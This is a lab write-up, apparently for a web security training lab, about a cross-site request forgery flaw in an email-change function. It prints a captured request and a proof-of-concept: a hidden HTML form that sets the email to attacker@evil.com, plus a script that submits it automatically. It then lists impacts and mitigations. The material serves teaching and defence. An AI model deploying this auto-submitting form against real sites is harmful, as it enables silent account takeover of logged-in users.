Lab Write-up: CSRF Vulnerability with No Defenses


ðŸ”¹ Vulnerability Overview

The applicationâ€™s email change functionality is vulnerable to Cross-Site Request Forgery (CSRF).
An attacker can trick a logged-in user into unknowingly submitting a request that changes their account email address, leading to account takeover.

ðŸ”¹ Conditions for CSRF Exploitation

For CSRF to work, three conditions must be met:

Sensitive Action Exists

A critical function (change email) is available.

Session Cookie-Based Authentication

Authentication relies only on automatically sent cookies.

No Unpredictable Parameters

The request does not contain CSRF tokens, OTPs, or unpredictable values.

âœ… All conditions are satisfied in this lab.

ðŸ”¹ Crafting the Proof-of-Concept (PoC)

Step 1 â€“ Analyze Request
When changing the email in the application, the following request is sent:

POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=ObL4BqYBvXWLr0bukRbk6khaW8zT0aWr
Content-Type: application/x-www-form-urlencoded

email=victim@lab.com


Only the email parameter is needed.

No CSRF tokens or other defenses are present.

Step 2 â€“ Create Malicious Form
The attacker builds an HTML form that replicates this request:

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>


Step 3 â€“ Auto-submit the Form
To ensure the victim does not need to click anything, add JavaScript to auto-submit:

<script>
    document.forms[0].submit();
</script>


Step 4 â€“ Host on Exploit Server

Save the code in the exploit server provided.

Deliver the malicious link to the victim.

When the victim (already logged in) visits this page, their email is silently changed to attacker@evil.com.

ðŸ”¹ Impact

Account Takeover: Attacker can reset the password using the new email.

Privilege Abuse: If the victim has elevated rights, the attacker inherits them.

ðŸ”¹ Mitigation

Implement anti-CSRF tokens in all sensitive requests.

Use SameSite=strict or Lax cookie attributes.

Require re-authentication for critical account actions.

âœ… Summary:
By replicating the legitimate email change request and auto-submitting it via a malicious page, an attacker can exploit CSRF to hijack user accounts.
